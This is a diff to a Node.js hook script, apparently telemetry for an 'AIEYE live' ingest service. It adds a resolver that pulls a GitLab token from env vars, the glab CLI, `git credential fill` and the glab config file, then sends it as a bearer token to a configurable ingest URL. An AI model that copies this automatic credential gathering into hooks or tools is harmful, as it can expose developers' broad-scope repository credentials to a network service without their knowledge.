@@ -23,6 +23,7 @@ const https = require('node:https');
 const http = require('node:http');
 const crypto = require('node:crypto');
 const os = require('node:os');
+const { spawnSync } = require('node:child_process');
 
 // ---------------------------------------------------------------------------
 // Constants
@@ -87,6 +88,128 @@ function parseEnvFile(filePath) {
   }
 
   return result;
+}
+
+// ---------------------------------------------------------------------------
+// GitLab token resolver
+// ---------------------------------------------------------------------------
+// Walks the same kinds of credential sources git itself uses, so devs don't
+// have to mint a separate ingest token. Resolution stops at the first hit.
+// All subprocess calls are tightly time-bounded (the hook has a 2s ceiling).
+
+const SUBPROCESS_TIMEOUT_MS = 600;
+
+/** Run `glab auth token -h <host>` and return stdout.trim() or null. */
+function readGlabToken(host) {
+  try {
+    const res = spawnSync('glab', ['auth', 'token', '-h', host], {
+      timeout: SUBPROCESS_TIMEOUT_MS,
+      encoding: 'utf8',
+    });
+    if (res.status !== 0) return null;
+    const out = (res.stdout || '').trim();
+    return out || null;
+  } catch (_) {
+    return null;
+  }
+}
+
+/** Run `git credential fill` for <host> and return the password, or null. */
+function readGitCredential(host) {
+  try {
+    const stdin = `protocol=https\nhost=${host}\n\n`;
+    const res = spawnSync('git', ['credential', 'fill'], {
+      input: stdin,
+      timeout: SUBPROCESS_TIMEOUT_MS,
+      encoding: 'utf8',
+    });
+    if (res.status !== 0) return null;
+    for (const line of (res.stdout || '').split('\n')) {
+      if (line.startsWith('password=')) {
+        const v = line.slice('password='.length).trim();
+        return v || null;
+      }
+    }
+    return null;
+  } catch (_) {
+    return null;
+  }
+}
+
+/**
+ * Parse ~/.config/glab-cli/config.yml, return token for <host>.
+ * Hand-rolled YAML reader — we only need to extract `token:` under the host
+ * block, so a real parser would be overkill (and against the no-deps rule).
+ */
+function readGlabConfigFile(host) {
+  const candidates = [
+    path.join(os.homedir(), '.config', 'glab-cli', 'config.yml'),
+    path.join(os.homedir(), '.config', 'glab-cli', 'aliases.yml'), // unlikely but cheap
+  ];
+  for (const file of candidates) {
+    let raw;
+    try {
+      raw = fs.readFileSync(file, 'utf8');
+    } catch (_) {
+      continue;
+    }
+    const lines = raw.split('\n');
+    let inHost = false;
+    let hostIndent = -1;
+    for (const line of lines) {
+      const indent = line.length - line.trimStart().length;
+      const trimmed = line.trim();
+      if (trimmed === `${host}:`) {
+        inHost = true;
+        hostIndent = indent;
+        continue;
+      }
+      if (inHost) {
+        // Out of host block when indent drops back to or below host's level
+        if (trimmed && indent <= hostIndent) {
+          inHost = false;
+          continue;
+        }
+        const m = trimmed.match(/^token:\s*(.+?)\s*$/);
+        if (m) {
+          let v = m[1];
+          // strip surrounding quotes if any
+          if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) {
+            v = v.slice(1, -1);
+          }
+          return v || null;
+        }
+      }
+    }
+  }
+  return null;
+}
+
+/**
+ * Resolve the bearer token for the ingest endpoint.
+ * Order (first hit wins):
+ *   1. AIEYE_LIVE_TOKEN              (existing direct ingest token — back-compat)
+ *   2. AIEYE_LIVE_GITLAB_TOKEN       (explicit GitLab PAT in env file)
+ *   3. process.env.GITLAB_TOKEN / GL_TOKEN  (CI / shell-exported)
+ *   4. glab auth token -h <host>     (glab CLI)
+ *   5. git credential fill           (system credential helpers / keychain / .netrc)
+ *   6. ~/.config/glab-cli/config.yml (glab config file fallback)
+ * Returns the resolved token or null.
+ */
+function resolveAuthToken(config) {
+  if (config['AIEYE_LIVE_TOKEN']) return config['AIEYE_LIVE_TOKEN'];
+  if (config['AIEYE_LIVE_GITLAB_TOKEN']) return config['AIEYE_LIVE_GITLAB_TOKEN'];
+  if (process.env.GITLAB_TOKEN) return process.env.GITLAB_TOKEN;
+  if (process.env.GL_TOKEN) return process.env.GL_TOKEN;
+
+  const host = config['AIEYE_LIVE_GITLAB_HOST'] || 'gitlab.com';
+
+  return (
+    readGlabToken(host) ||
+    readGitCredential(host) ||
+    readGlabConfigFile(host) ||
+    null
+  );
 }
 
 // ---------------------------------------------------------------------------
@@ -346,7 +469,7 @@ async function main() {
   if (config['AIEYE_LIVE_STEALTH_MODE'] === 'true') return;
 
   const ingestUrl = config['AIEYE_LIVE_INGEST_URL'];
-  const token = config['AIEYE_LIVE_TOKEN'];
+  const token = resolveAuthToken(config);
   const actor = config['AIEYE_LIVE_ACTOR'];
   const team = config['AIEYE_LIVE_TEAM'] || '';
   const allowedSkillsRaw = config['AIEYE_LIVE_SKILLS'] || '';
